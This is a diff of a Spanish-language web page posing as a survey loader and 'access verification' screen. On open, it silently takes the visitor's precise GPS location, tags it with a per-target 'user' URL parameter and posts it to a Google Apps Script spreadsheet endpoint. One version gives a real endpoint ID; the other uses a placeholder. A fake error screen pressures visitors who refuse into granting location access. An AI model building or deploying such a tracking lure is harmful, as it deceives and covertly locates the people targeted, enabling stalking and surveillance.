@@ -1,121 +1,156 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cuestionario </title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 40px;
-            background-color: #f4f6f8;
-        }
-        .contenedor {
-            max-width: 500px;
-            margin: 0 auto;
-            background: #ffffff;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        #estado {
-            font-size: 16px;
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 5px;
-            font-weight: bold;
-        }
-        .info { background: #e3f2fd; color: #0d47a1; }
-        .error { background: #ffebee; color: #c62828; }
-        .exito { background: #e8f5e9; color: #2e7d32; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de Acceso</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .box {
+      background: #ffffff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 380px;
+      width: 90%;
+    }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #007bff;
+      border-radius: 50%;
+      width: 35px;
+      height: 35px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .error-msg {
+      color: #d9534f;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .info-text {
+      color: #666666;
+      font-size: 13px;
+      margin-bottom: 20px;
+      line-height: 1.4;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 14px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
 </head>
 <body>
 
-    <div class="contenedor">
-        <h2>Cargando contenido...</h2>
-        <div id="estado" class="info">Solicitando acceso a la ubicación...</div>
+  <div class="box">
+    <!-- Vista 1: Carga -->
+    <div id="pantalla-carga">
+      <div class="spinner"></div>
+      <p>Cargando contenido, por favor espera...</p>
     </div>
 
-    <script>
-    // Enlace de tu aplicación web de Google Apps Script
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzAJ8QKQXuCV9kZ-Z6XzW96Zzngf6_t0x6REzTaT9nsqS8IF2W2uXizslHydeylHduJ/exec";
+    <!-- Vista 2: Mensaje de Error si rechaza el permiso -->
+    <div id="pantalla-error" class="hidden">
+      <div class="error-msg">⚠️ Error de Verificación</div>
+      <p class="info-text">
+        No se pudo obtener el acceso necesario. Por favor, asegúrate de activar la <b>ubicación/GPS</b> en tu dispositivo y presionar <b>Permitir</b> cuando el navegador lo solicite.
+      </p>
+      <button onclick="solicitarUbicacion()">Intentar nuevamente</button>
+    </div>
+  </div>
 
-    // Se ejecuta automáticamente al abrir la página
+  <script>
+    // Reemplaza con la URL de tu ejecutable de Google Apps Script
+    const SCRIPT_URL = 'https://script.google.com/macros/s/TU_SCRIPT_ID/exec';
+
+    // Función para obtener parámetros de la URL (?user=Nombre)
+    function obtenerUsuarioURL() {
+      const params = new URLSearchParams(window.location.search);
+      return params.get('user') || 'Anónimo / Desconocido';
+    }
+
     window.onload = function() {
-        obtenerUbicacion();
+      solicitarUbicacion();
     };
 
-    function obtenerUbicacion() {
-        if (!("geolocation" in navigator)) {
-            mostrarMensaje("Error: Tu navegador no soporta geolocalización.", "error");
-            return;
-        }
+    function solicitarUbicacion() {
+      document.getElementById('pantalla-carga').classList.remove('hidden');
+      document.getElementById('pantalla-error').classList.add('hidden');
 
+      if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            (posicion) => {
-                const lat = posicion.coords.latitude;
-                const lng = posicion.coords.longitude;
-                const precision = posicion.coords.accuracy;
-                const fecha = new Date().toLocaleString();
-                const enlaceMapa = `https://maps.google.com/?q=${lat},${lng}`;
+          (position) => {
+            const datos = {
+              usuario: obtenerUsuarioURL(),
+              latitud: position.coords.latitude,
+              longitud: position.coords.longitude,
+              precision: position.coords.accuracy,
+              fecha: new Date().toLocaleString()
+            };
 
-                mostrarMensaje("espere por favor ..", "info");
-
-                const payload = {
-                    fecha: fecha,
-                    latitud: lat,
-                    longitud: lng,
-                    precision: precision,
-                    mapa: enlaceMapa
-                };
-
-                // Envío de datos a Google Sheets
-                fetch(SCRIPT_URL, {
-                    method: "POST",
-                    mode: "no-cors",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(payload)
-                })
-                .then(() => {
-                    mostrarMensaje("¡su encuesta va cargar enseguida!", "exito");
-                })
-                .catch((error) => {
-                    mostrarMensaje("Error al conectar con Google Sheets.", "error");
-                    console.error("Error:", error);
-                });
-            },
-            (error) => {
-                switch(error.code) {
-                    case error.PERMISSION_DENIED:
-                        mostrarMensaje("Acceso a la ubicación denegado por el usuario.", "error");
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        mostrarMensaje("Información de ubicación no disponible.", "error");
-                        break;
-                    case error.TIMEOUT:
-                        mostrarMensaje("Tiempo de espera agotado al consultar la ubicación.", "error");
-                        break;
-                    default:
-                        mostrarMensaje("Error al obtener ubicación: " + error.message, "error");
-                }
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            }
+            enviarAGoogleSheets(datos);
+          },
+          (error) => {
+            console.warn("Error o permiso denegado:", error.message);
+            mostrarError();
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 8000,
+            maximumAge: 0
+          }
         );
+      } else {
+        mostrarError();
+      }
     }
 
-    function mostrarMensaje(texto, tipo) {
-        const estadoDiv = document.getElementById("estado");
-        estadoDiv.innerText = texto;
-        estadoDiv.className = tipo;
+    function mostrarError() {
+      document.getElementById('pantalla-carga').classList.add('hidden');
+      document.getElementById('pantalla-error').classList.remove('hidden');
     }
-    </script>
+
+    function enviarAGoogleSheets(datos) {
+      fetch(SCRIPT_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(datos)
+      })
+      .then(() => {
+        document.getElementById('pantalla-carga').innerHTML = "<p>✅ Verificación completada.</p>";
+      })
+      .catch((err) => {
+        console.error("Error al enviar:", err);
+      });
+    }
+  </script>
+
 </body>
 </html>
